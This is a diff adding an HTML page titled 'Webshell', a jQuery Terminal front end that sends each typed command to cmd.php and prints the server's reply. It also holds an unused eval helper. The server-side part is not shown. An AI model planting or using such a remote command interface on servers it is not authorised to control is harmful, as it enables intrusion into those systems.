@@ -1,0 +1,35 @@
+<!doctype html>
+  <html>
+    <head>
+        <title>Webshell</title>
+        <link href="https://cdnjs.cloudflare.com/ajax/libs/jquery.terminal/2.36.0/css/jquery.terminal.min.css" rel="stylesheet"/>
+    </head>
+    <body>
+      <div id="terminal"></div>
+      <script src="https://code.jquery.com/jquery-3.7.0.min.js"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.terminal/2.36.0/js/jquery.terminal.min.js"></script>
+      <script>
+        var __EVAL = (s) => eval(`void (__EVAL = ${__EVAL}); ${s}`);
+            jQuery(function($, undefined) {
+                $('#terminal').terminal(function(command) {
+                    if (command !== '') {
+                        $.ajax({
+                            method:"POST",
+                            url:"cmd.php",
+                            data:{cmd:command},
+                            success:re=>{
+                                var dt = JSON.parse(re);
+                                this.echo(dt.data);
+                            }
+                        });
+                    }
+                }, {
+                    greetings: 'Web Shell',
+                    name: 'js_demo',
+                    height: 700,
+                    prompt: 'webshell~$ '
+                });
+            });
+      </script>
+    </body>
+  </html>
